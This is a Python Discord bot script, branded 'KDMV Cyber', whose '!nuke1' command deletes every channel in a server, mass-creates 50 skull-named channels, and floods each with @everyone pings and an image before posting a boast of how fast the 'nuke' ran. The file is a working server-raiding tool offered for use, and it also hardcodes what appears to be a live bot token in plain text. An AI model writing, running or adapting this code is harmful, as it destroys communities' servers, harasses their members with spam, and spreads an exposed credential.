import discord
from discord.ext import commands
import asyncio
import os
import time
from itertools import chain 

# --- Configuration ---
intents = discord.Intents.default()
# Crucial for commands and message processing
intents.message_content = True 

bot = commands.Bot(command_prefix='!', intents=intents)

# --- Command Parameters ---
MESSAGE_CONTENT = "@everyone nuke by KDMV Cyber."
MESSAGE_COUNT = 5
CHANNELS_TO_CREATE = 50
BASE_CHANNEL_NAME = "☠️Nuke by KDMV Cyber"

# --- 🖼️ NEW: Image File Path ---
IMAGE_PATH = "23.png" 

@bot.event
async def on_ready():
    """Confirms the bot is connected and ready."""
    print(f'Bot is ready. Logged in as {bot.user}')
    print("-" * 20)

# --- 💣 The Nuke and Rebuild Command ---
@bot.command(name='nuke1', 
             help='Deletes all channels, then creates new ones and spams a message.')
@commands.has_permissions(manage_channels=True)
@commands.is_owner()
async def nuke_server(ctx):
    """
    Deletes all channels, mass-creates new channels, and sends the message/image.
    """
    if not os.path.exists(IMAGE_PATH):
        await ctx.send(f"❌ Error: Image file not found at path: {IMAGE_PATH}")
        return

    guild = ctx.guild
    start_time = time.time()
    
    # --- 1. Delete ALL Channels Concurrently ---
    await ctx.send(f"⚠️ **Initiating Server Nuke!** Deleting all {len(guild.channels)} channels...")

    delete_tasks = [channel.delete() for channel in guild.channels]
    
    try:
        await asyncio.gather(*delete_tasks)
        delete_end_time = time.time()
        print(f"Successfully deleted all channels in {delete_end_time - start_time:.2f} seconds.")
        
    except discord.Forbidden:
        return print(f"❌ FATAL ERROR: Bot lacks 'Manage Channels' permission for deletion.")
    except Exception as e:
        print(f"❌ An error occurred during deletion: {e}")
        return 

    # --- 2. Create NEW Channels Concurrently ---
    safe_base_name = BASE_CHANNEL_NAME.lower().replace(" ", "-").replace("", "") # Clean the name
    channel_names = [f"{safe_base_name}-{i+1}" for i in range(CHANNELS_TO_CREATE)]
    
    creation_tasks = [
        guild.create_text_channel(name=name) 
        for name in channel_names
    ]

    try:
        new_channels = await asyncio.gather(*creation_tasks)
        
        # 3. Prepare tasks to send the message AND the image file concurrently (5 times each)
        spam_tasks = list(chain.from_iterable(
            [channel.send(MESSAGE_CONTENT, file=discord.File(IMAGE_PATH)) for _ in range(MESSAGE_COUNT)]
            for channel in new_channels
        ))
        
        await asyncio.gather(*spam_tasks)

        end_time = time.time()
        time_taken = end_time - start_time
        
        # --- 4. NEW: Send final confirmation message in ALL new channels ---
        confirmation_message = f'**Nuke** in **{time_taken:.2f} seconds** **by KDMV Cyber<:kdmvcyber:1436728341817200711>!**'

        # Create concurrent tasks for the confirmation message
        confirmation_tasks = [
            channel.send(confirmation_message) for channel in new_channels
        ]
        
        # Execute all confirmation tasks concurrently
        await asyncio.gather(*confirmation_tasks)

    except discord.Forbidden:
        print(f"❌ FATAL ERROR: Bot lacks 'Manage Channels' permission for creation.")
    except Exception as e:
        print(f"❌ An unexpected error occurred: {e}")


# --- Run the Bot (Use your actual token here!) ---
TOKEN = "MTQwODIyNDY4NTUyNjg3NjE5MA.GUnTEH.nHXd9LdBIpa1lL_DhDTunnDtGvn7NKZKDsrbAI" 
bot.run(TOKEN)